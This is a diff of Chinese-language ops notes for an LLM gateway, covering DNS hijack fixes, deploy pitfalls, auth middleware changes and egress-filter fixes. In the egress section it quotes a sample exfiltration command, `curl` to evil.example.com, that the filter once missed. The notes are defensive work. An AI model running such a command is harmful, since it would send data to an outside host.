@@ -49,6 +49,7 @@
   - **252 上 mihomo（tun+fake-ip，`dns-hijack any:53`）会劫持 mesh 域名解析**：252 按 `llm.itestu.cn` 访问网关超时而按 IP 正常。已修：`/etc/mihomo/config.yaml` 加 `fake-ip-filter: +.llm.itestu.cn` + `nameserver-policy +.llm.itestu.cn → 100.106.190.139`（252 netbird 解析器），API 热重载。**策略不可放宽到 `+.itestu.cn`**（netbird 上游转发同样被劫持，会弄坏兄弟 vhost）。详见 host-first 部署文档 §5.1。
   - **252 的 netbird 客户端是 podman 容器 `nb-252-host`**（非宿主服务；二进制在镜像里，状态盘 bind-mount 在 `/opt/netbird/openpocket/nb-252-host-state`）。管理用 `netbird-252 status -d`（宿主封装=`podman exec`）；重启 `podman restart nb-252-host` 实测 peer 身份/IP 保留、三链路自愈。代理订阅已从陈旧内联快照改为 efanyun provider（与 mac network-switch 对齐，103 节点全活）。⚠️ 手工改 252 mihomo 组配置按 `^- ` 切块而非 `^- name:`（Auto/Cursor-Direct 首键是 `- interval:`）。
   - `com.kaixuan.llm-gateway` launchd 代理已停用（备份 `~/kaixuan/llm-gateway-go-v2/backups/`）——KeepAlive 重生网关会跟 deploy-local 的 nohup+pid 生命周期互踩（抢 8781 候选端口）；
+  - **host-first 部署前必须先装前端依赖**（`web/`、`web-mobile/` 各自 `corepack pnpm install --frozen-lockfile`）：`web/node_modules` 缺失时 `build_frontend` 只 warn 不拒绝，会把**空 web/**（仅 version.json）staging 进发布包，网关静态探测回落源码 `web/` 发出未构建的 Vite 模板 → 浏览器白页（2026-10-11 下午 2538 轮事故，2539 修复）；建议后续给 deploy-local 补 refuse 门。另一紧邻缺陷已修码（r2540）：SPA 顶层路由（/dashboard 等）深链/刷新曾 401 `missing_key`——`AuthMiddleware` 现按 `Accept: text/html` 导航放行（/v1、/mock、/plugins 除外），见 middleware/auth_mw_test.go 三件套；详见部署文档 §5.2。
   - 最新 macOS SDK（27.0）与 CLT 链接器不兼容（tapi error），`dl_resolve_sdkroot` 自动降级（当前 26.5）；裸 `go run`（cgo 形态）会 SIGSEGV，用 CGO_ENABLED=0 + SDKROOT 钉扎；
   - PG 的 E'' 替换串里 `\1` 是八进制转义不是 backreference；视图族有冻结/动态交集两代合法形态，通道文件按形态探测分支。
 - 契约门：`bash tests/deploy_host_first_contract_test.sh`（verify.sh 已接）；自动安装端到端：`DL_AUTOINSTALL_TEST=1 bash tests/deploy_host_autoinstall_test.sh`（真实源码构建，分钟级，opt-in）
@@ -134,7 +135,9 @@
 - ~~**域名形式的外传目标从不被拦**~~（`curl http://evil.example.com/collect`
   不触发阻断）：`ScopeEgress` 只匹配 IP 规则。**r1016 已修**（域名只在 URL 主机位
   识别，不做裸点分词，否则 `cat README.md`、`v1.2.3` 全会被误判），**r1017 补齐
-  残留的裸主机+端口形态**。两者均已推送、未部署。
+  残留的裸主机+端口形态**。**两者已随 2026-10-11 16:34 的 2537（154）/2539（245）
+  上线**——那两轮部署由并行会话执行，`37099db2` 是本仓提交，含 r1016/r1017。
+  线上复验：`/v1/models` 对伪造 `sk-` token 已返回 401（修复前 200 + 615 个模型）。
   **关键设计**：默认公网可达即阻断，只豁免明确不可路由的主机
   （`.local/.internal/.cluster.local/.lan/.home.arpa` 等 + 单标签名）。
 - ~~**email 形状的 `user@host` 误阻断内网目标**~~：`ssh deploy@build.corp.internal`
@@ -165,9 +168,17 @@
    已排除的疑似源：本仓全历史、`-cursor`、`-5` 两个并发 checkout、154
    `/opt/llm-gateway-go-source`（旧快照）、`/root/llm-gateway-go-session-v2`
    （yaml 是 7 月老形态 `20b17bb…`，不含五修复，排除）。
-2. **r1016/r1017 未上生产是时间线事实**：2533 构建（01:39）早于 r1016（02:09）
-   与 r1017（10:36）提交。与提交信息自述「代码已推送、未部署（用户裁决）」一致。
-   **生产上 `ssh ops@内网域名` 误阻断、`/v1/models` 伪造 token 放行仍在发生**，
+2. ~~**r1016/r1017 未上生产是时间线事实**~~ —— **2026-10-11 21:00 实测推翻，已作废**。
+   本条写入时（2533，01:39）属实，但 16:34 的 2537/2539 部署（`37099db2`）已把
+   两者带上生产。**取证时踩了两个量具坑，都记在这里**：
+   - **245 的 release 二进制叫 `gateway`，不叫 `llm-gateway-go`**；按后者
+     `strings` 会报 No such file，看起来像「二进制不存在 / 被 strip」。本文件
+     早前「245 是 stripped ELF」的结论据此作废——它有完整符号表（`go1.` 命中 3）。
+   - **包级 `var` 不会留下 Go 符号名**（`egressHostFromBarePort`、
+     `egressHostFromPort` 均为 0），**`const` 更没有**（`barePortFollower` 为 0）。
+     拿符号名当指纹会得到假的「未包含」。可靠口径是 **rodata 里的正则字面量**
+     （stripped 二进制也读得到）：`\s+(\d{1,5})`、`a-z0-9._%+\-]+@`、
+     `0123456789>&|/` 三条在两台上均命中。
    待下次部署授权。
 3. **`/tmp/154env.sh`（本机与 154）均已不存在**——E2E 测试台的网关凭据丢失，
    `api_keys` 表只存 `key_hash` 无明文可回收。**下次跑 E2E 前需先找用户要 key**
